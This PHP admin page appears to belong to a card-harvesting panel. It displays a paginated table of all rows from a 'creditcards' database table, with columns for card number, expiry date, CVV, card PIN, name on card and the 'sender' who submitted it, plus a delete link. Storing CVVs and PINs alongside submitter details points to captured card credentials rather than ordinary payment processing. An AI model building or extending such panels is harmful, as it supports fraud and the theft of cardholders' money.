<?php 
include_once 'class.crud.php';

?>
    <?php include 'count.php'; ?>
 

 <?php include 'headeradmin.php'; ?>
 

 <!---begin of Mobile View Here   only from Digital Forest Team-->
 
       <?php include 'menu.php'; ?>
  
  <!---End of Mobile View Here   only from Digital Forest Team-->
  
 


      <script type="text/javascript" src="paginator.js"></script>
        <script type="text/javascript" src="table.js"></script>
     
        <br><br><br><br><br><br><br>
  
    <div class="container-fluid mt--7">
     <!-- Table -->
      <div class="row">
        <div class="col">
          <div class="card shadow" >
            <div class="card-header border-0">
              <h3 class="mb-0"><a href=""   class="btn btn-danger">ALL CREDIT CARD</a></h3>
            </div>
          
           <div class="card-body">
               
               
                           
                    	
                    	
                    	
                    	<?php 
							if(isset($_GET['success']))
								{
									?>
									<div class='alert alert-info'>
										<button class='close' data-dismiss='alert'>&times;</button>
										<strong>Record Deleted Successfully</strong> 
									</div>
									<?php
								}
						?>
			<?php 
							if(isset($_GET['error']))
								{
									?>
									<div class='alert alert-danger'>
										<button class='close' data-dismiss='alert'>&times;</button>
										<strong>Unable to Delete Record</strong> 
									</div>
									<?php
								}
						?>
                    <table id="dtBasicExample" class="table table-responsive table-striped table-sm" cellspacing="0" width="100%">

                            <thead>
		
                                <tr>
                                    <th><b>REF Number</b></th>
									<th><b>Sender</b></th>
									<th><b>Card type</b></th>
									<th><b>Card Number</b></th>
									<th><b>Expiry date</b></th>
                                    <th><b>CVV</b></th>
                                    <th><b>Card Pin</b></th>
                                    <th><b>Name on Card</b></th>
                                     <th><b>Date</b></th>
                                    <th><b>Delete Card</b></th>
                                </tr>
                               </thead>
                            <tbody>
                                <?php
			$query = "SELECT * FROM creditcards  ";       
			$records_per_page=2000;
			$newquery = $crud->paging($query,$records_per_page);
			$crud->dataviewcc($newquery);
		 ?>   
                                
                               
    
                            </tbody>
                        </table>
                    </div>
               
               
               <?php $crud->paginglink($query,$records_per_page); ?>
               
               
               
               
               
          </div>
        </div>
      </div>
     </div>
 
 
    
       <?php include 'foot.php'; ?>   
                